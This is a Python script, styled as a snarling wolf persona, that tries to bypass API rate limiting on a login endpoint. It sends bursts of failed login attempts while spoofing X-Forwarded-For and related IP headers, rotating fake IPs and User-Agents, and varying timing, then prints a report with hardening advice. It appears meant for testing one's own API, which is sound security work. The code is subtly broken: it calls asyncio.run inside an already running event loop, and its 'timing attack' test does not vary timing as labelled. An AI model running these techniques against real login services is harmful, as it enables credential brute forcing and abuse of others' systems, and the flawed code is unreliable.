"""
🐺 RATE LIMITING BYPASS EXPLOIT

*snarls with predatory glee* Bypasses rate limiting mechanisms to perform
brute force attacks and overwhelm your API endpoints!
"""

import asyncio
import time
from dataclasses import dataclass

import httpx
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()


@dataclass
class RateLimitTestResult:
    """Result of a rate limiting test"""

    endpoint: str
    method: str
    request_count: int
    success_count: int
    blocked_count: int
    average_response_time: float
    bypass_successful: bool
    bypass_method: str | None = None
    description: str | None = None


class RateLimitBypassExploit:
    """
    *circles with menacing intent* Bypasses rate limiting mechanisms

    *bares fangs with savage satisfaction* Tests for timing attacks,
    header manipulation, and distributed bypass techniques!
    """

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip("/")
        self.session = httpx.AsyncClient(timeout=30.0)

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.aclose()

    def run_exploit(self) -> list[RateLimitTestResult]:
        """
        *packs hunting formation* Execute comprehensive rate limiting bypass tests
        """
        console.print(
            Panel.fit(
                "[bold red]🐺 RATE LIMITING BYPASS EXPLOIT[/bold red]\n"
                "*snarls with predatory glee* Let's break your API protection!",
                border_style="red",
            )
        )

        results = []

        # Test 1: Basic rate limiting detection
        results.append(asyncio.run(self._test_basic_rate_limiting()))

        # Test 2: Header manipulation bypass
        results.append(asyncio.run(self._test_header_manipulation()))

        # Test 3: IP rotation bypass
        results.append(asyncio.run(self._test_ip_rotation()))

        # Test 4: Timing attack bypass
        results.append(asyncio.run(self._test_timing_attack()))

        # Test 5: User-Agent rotation bypass
        results.append(asyncio.run(self._test_user_agent_rotation()))

        return results

    async def _test_basic_rate_limiting(self) -> RateLimitTestResult:
        """Test basic rate limiting detection"""
        console.print("\n[bold yellow]🎯 Testing Basic Rate Limiting...[/bold yellow]")

        endpoint = "/api/auth/login"
        method = "POST"
        request_count = 20

        success_count = 0
        blocked_count = 0
        response_times = []

        for i in range(request_count):
            start_time = time.time()

            try:
                # Send login request with invalid credentials
                response = await self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": f"test_user_{i}", "password": "wrong_password"},
                    timeout=5,
                )

                end_time = time.time()
                response_times.append(end_time - start_time)

                if response.status_code == 200:
                    success_count += 1
                    console.print(f"[green]✓[/green] Request {i + 1}: Success (200)")
                elif response.status_code == 429:
                    blocked_count += 1
                    console.print(f"[red]✗[/red] Request {i + 1}: Rate Limited (429)")
                else:
                    console.print(
                        f"[yellow]⚠[/yellow] Request {i + 1}: Status {response.status_code}"
                    )

            except Exception as e:
                console.print(f"[red]✗[/red] Request {i + 1}: Error - {e!s}")

            # Small delay between requests
            await asyncio.sleep(0.1)

        average_response_time = (
            sum(response_times) / len(response_times) if response_times else 0
        )
        bypass_successful = success_count > 5  # If more than 5 requests succeeded

        return RateLimitTestResult(
            endpoint=endpoint,
            method=method,
            request_count=request_count,
            success_count=success_count,
            blocked_count=blocked_count,
            average_response_time=average_response_time,
            bypass_successful=bypass_successful,
            bypass_method="Basic Rate Limiting Test" if bypass_successful else None,
            description="Tested basic rate limiting with rapid requests",
        )

    async def _test_header_manipulation(self) -> RateLimitTestResult:
        """Test rate limiting bypass through header manipulation"""
        console.print(
            "\n[bold yellow]🎯 Testing Header Manipulation Bypass...[/bold yellow]"
        )

        endpoint = "/api/auth/login"
        method = "POST"
        request_count = 15

        success_count = 0
        blocked_count = 0
        response_times = []

        # Headers to try for bypass
        bypass_headers = [
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Real-IP": "10.0.0.1"},
            {"X-Originating-IP": "172.16.0.1"},
            {"X-Remote-IP": "203.0.113.1"},
            {"X-Remote-Addr": "198.51.100.1"},
            {"X-Client-IP": "192.0.2.1"},
            {"X-Forwarded": "for=192.168.1.1"},
            {"Forwarded": "for=192.168.1.1"},
            {"X-Cluster-Client-IP": "192.168.1.1"},
            {"X-ProxyUser-Ip": "192.168.1.1"},
        ]

        for i in range(request_count):
            start_time = time.time()

            try:
                # Rotate through different headers
                headers = bypass_headers[i % len(bypass_headers)]

                response = await self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": f"test_user_{i}", "password": "wrong_password"},
                    headers=headers,
                    timeout=5,
                )

                end_time = time.time()
                response_times.append(end_time - start_time)

                if response.status_code == 200:
                    success_count += 1
                    console.print(
                        f"[green]✓[/green] Request {i + 1}: Success with {list(headers.keys())[0]}"
                    )
                elif response.status_code == 429:
                    blocked_count += 1
                    console.print(f"[red]✗[/red] Request {i + 1}: Rate Limited (429)")
                else:
                    console.print(
                        f"[yellow]⚠[/yellow] Request {i + 1}: Status {response.status_code}"
                    )

            except Exception as e:
                console.print(f"[red]✗[/red] Request {i + 1}: Error - {e!s}")

            # Small delay between requests
            await asyncio.sleep(0.2)

        average_response_time = (
            sum(response_times) / len(response_times) if response_times else 0
        )
        bypass_successful = success_count > 3  # If more than 3 requests succeeded

        return RateLimitTestResult(
            endpoint=endpoint,
            method=method,
            request_count=request_count,
            success_count=success_count,
            blocked_count=blocked_count,
            average_response_time=average_response_time,
            bypass_successful=bypass_successful,
            bypass_method="Header Manipulation" if bypass_successful else None,
            description="Tested rate limiting bypass through header manipulation",
        )

    async def _test_ip_rotation(self) -> RateLimitTestResult:
        """Test rate limiting bypass through IP rotation"""
        console.print("\n[bold yellow]🎯 Testing IP Rotation Bypass...[/bold yellow]")

        endpoint = "/api/auth/login"
        method = "POST"
        request_count = 12

        success_count = 0
        blocked_count = 0
        response_times = []

        # Simulate different IP addresses
        fake_ips = [
            "192.168.1.1",
            "192.168.1.2",
            "192.168.1.3",
            "10.0.0.1",
            "10.0.0.2",
            "10.0.0.3",
            "172.16.0.1",
            "172.16.0.2",
            "172.16.0.3",
            "203.0.113.1",
            "203.0.113.2",
            "203.0.113.3",
        ]

        for i in range(request_count):
            start_time = time.time()

            try:
                # Use different IP for each request
                headers = {"X-Forwarded-For": fake_ips[i % len(fake_ips)]}

                response = await self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": f"test_user_{i}", "password": "wrong_password"},
                    headers=headers,
                    timeout=5,
                )

                end_time = time.time()
                response_times.append(end_time - start_time)

                if response.status_code == 200:
                    success_count += 1
                    console.print(
                        f"[green]✓[/green] Request {i + 1}: Success with IP {fake_ips[i % len(fake_ips)]}"
                    )
                elif response.status_code == 429:
                    blocked_count += 1
                    console.print(f"[red]✗[/red] Request {i + 1}: Rate Limited (429)")
                else:
                    console.print(
                        f"[yellow]⚠[/yellow] Request {i + 1}: Status {response.status_code}"
                    )

            except Exception as e:
                console.print(f"[red]✗[/red] Request {i + 1}: Error - {e!s}")

            # Small delay between requests
            await asyncio.sleep(0.3)

        average_response_time = (
            sum(response_times) / len(response_times) if response_times else 0
        )
        bypass_successful = success_count > 2  # If more than 2 requests succeeded

        return RateLimitTestResult(
            endpoint=endpoint,
            method=method,
            request_count=request_count,
            success_count=success_count,
            blocked_count=blocked_count,
            average_response_time=average_response_time,
            bypass_successful=bypass_successful,
            bypass_method="IP Rotation" if bypass_successful else None,
            description="Tested rate limiting bypass through IP rotation",
        )

    async def _test_timing_attack(self) -> RateLimitTestResult:
        """Test rate limiting bypass through timing attacks"""
        console.print("\n[bold yellow]🎯 Testing Timing Attack Bypass...[/bold yellow]")

        endpoint = "/api/auth/login"
        method = "POST"
        request_count = 10

        success_count = 0
        blocked_count = 0
        response_times = []

        # Test different timing intervals
        timing_intervals = [0.5, 1.0, 1.5, 2.0, 2.5, 3.0, 3.5, 4.0, 4.5, 5.0]

        for i in range(request_count):
            start_time = time.time()

            try:
                response = await self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": f"test_user_{i}", "password": "wrong_password"},
                    timeout=5,
                )

                end_time = time.time()
                response_times.append(end_time - start_time)

                if response.status_code == 200:
                    success_count += 1
                    console.print(
                        f"[green]✓[/green] Request {i + 1}: Success with {timing_intervals[i]}s delay"
                    )
                elif response.status_code == 429:
                    blocked_count += 1
                    console.print(f"[red]✗[/red] Request {i + 1}: Rate Limited (429)")
                else:
                    console.print(
                        f"[yellow]⚠[/yellow] Request {i + 1}: Status {response.status_code}"
                    )

            except Exception as e:
                console.print(f"[red]✗[/red] Request {i + 1}: Error - {e!s}")

            # Wait for the specified interval
            if i < len(timing_intervals) - 1:
                await asyncio.sleep(timing_intervals[i])

        average_response_time = (
            sum(response_times) / len(response_times) if response_times else 0
        )
        bypass_successful = success_count > 1  # If more than 1 request succeeded

        return RateLimitTestResult(
            endpoint=endpoint,
            method=method,
            request_count=request_count,
            success_count=success_count,
            blocked_count=blocked_count,
            average_response_time=average_response_time,
            bypass_successful=bypass_successful,
            bypass_method="Timing Attack" if bypass_successful else None,
            description="Tested rate limiting bypass through timing attacks",
        )

    async def _test_user_agent_rotation(self) -> RateLimitTestResult:
        """Test rate limiting bypass through User-Agent rotation"""
        console.print(
            "\n[bold yellow]🎯 Testing User-Agent Rotation Bypass...[/bold yellow]"
        )

        endpoint = "/api/auth/login"
        method = "POST"
        request_count = 8

        success_count = 0
        blocked_count = 0
        response_times = []

        # Different User-Agent strings
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/91.0.4472.124",
        ]

        for i in range(request_count):
            start_time = time.time()

            try:
                # Use different User-Agent for each request
                headers = {"User-Agent": user_agents[i % len(user_agents)]}

                response = await self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"username": f"test_user_{i}", "password": "wrong_password"},
                    headers=headers,
                    timeout=5,
                )

                end_time = time.time()
                response_times.append(end_time - start_time)

                if response.status_code == 200:
                    success_count += 1
                    console.print(
                        f"[green]✓[/green] Request {i + 1}: Success with rotated User-Agent"
                    )
                elif response.status_code == 429:
                    blocked_count += 1
                    console.print(f"[red]✗[/red] Request {i + 1}: Rate Limited (429)")
                else:
                    console.print(
                        f"[yellow]⚠[/yellow] Request {i + 1}: Status {response.status_code}"
                    )

            except Exception as e:
                console.print(f"[red]✗[/red] Request {i + 1}: Error - {e!s}")

            # Small delay between requests
            await asyncio.sleep(0.4)

        average_response_time = (
            sum(response_times) / len(response_times) if response_times else 0
        )
        bypass_successful = success_count > 1  # If more than 1 request succeeded

        return RateLimitTestResult(
            endpoint=endpoint,
            method=method,
            request_count=request_count,
            success_count=success_count,
            blocked_count=blocked_count,
            average_response_time=average_response_time,
            bypass_successful=bypass_successful,
            bypass_method="User-Agent Rotation" if bypass_successful else None,
            description="Tested rate limiting bypass through User-Agent rotation",
        )

    def generate_rate_limit_report(self, results: list[RateLimitTestResult]) -> None:
        """Generate a comprehensive rate limiting bypass report"""
        console.print("\n[bold red]🎯 RATE LIMITING BYPASS REPORT[/bold red]")

        if not results:
            console.print("[yellow]No rate limiting test results to report.[/yellow]")
            return

        # Summary statistics
        total_tests = len(results)
        bypasses_found = len([r for r in results if r.bypass_successful])

        # Summary table
        table = Table(title="🐺 Rate Limiting Test Summary")
        table.add_column("Test Type", style="cyan")
        table.add_column("Requests", style="green")
        table.add_column("Success", style="yellow")
        table.add_column("Blocked", style="red")
        table.add_column("Bypass", style="magenta")

        for result in results:
            bypass_status = "✓ YES" if result.bypass_successful else "✗ NO"
            table.add_row(
                result.bypass_method or "Basic Test",
                str(result.request_count),
                str(result.success_count),
                str(result.blocked_count),
                bypass_status,
            )

        console.print(table)

        # Bypass methods found
        if bypasses_found > 0:
            console.print(
                Panel.fit(
                    "[bold red]🚨 RATE LIMITING BYPASSES DETECTED![/bold red]\n"
                    "*snarls with predatory satisfaction*\n"
                    "Your rate limiting can be bypassed using:\n\n"
                    + "\n".join(
                        [
                            f"• {result.bypass_method}"
                            for result in results
                            if result.bypass_successful
                        ]
                    ),
                    border_style="red",
                )
            )
        else:
            console.print(
                Panel.fit(
                    "[bold green]✅ RATE LIMITING APPEARS SECURE ✅[/bold green]\n"
                    "*howls with respect*\n"
                    "No rate limiting bypasses detected!",
                    border_style="green",
                )
            )

        # Recommendations
        console.print(
            Panel.fit(
                "[bold red]🛡️ RATE LIMITING SECURITY RECOMMENDATIONS[/bold red]\n"
                "Based on rate limiting bypass tests:\n\n"
                "• Implement rate limiting based on multiple factors (IP, User-Agent, etc.)\n"
                "• Use distributed rate limiting (Redis, etc.)\n"
                "• Implement progressive delays for repeated violations\n"
                "• Add CAPTCHA after rate limit violations\n"
                "• Monitor for suspicious patterns\n"
                "• Implement IP whitelisting for trusted sources\n"
                "• Use rate limiting middleware that's hard to bypass\n"
                "• Implement request fingerprinting\n"
                "• Add rate limiting to all sensitive endpoints\n"
                "• Consider using CDN-based rate limiting",
                border_style="red",
            )
        )


async def main():
    """
    *howls with purpose* Main execution function
    """
    console.print(
        Panel.fit(
            "[bold red]🐺 RATE LIMITING BYPASS EXPLOIT[/bold red]\n"
            "*snarls with predatory glee* Proving your rate limiting is weak!",
            border_style="red",
        )
    )

    # Run the exploit
    async with RateLimitBypassExploit() as exploit:
        results = exploit.run_exploit()

        # Generate report
        exploit.generate_rate_limit_report(results)

        console.print(
            Panel.fit(
                "[bold red]*snarls with predatory satisfaction*[/bold red]\n"
                "Your rate limiting has been torn apart!\n"
                "Time to harden your API protection, pup! 🐺",
                border_style="red",
            )
        )


if __name__ == "__main__":
    asyncio.run(main())
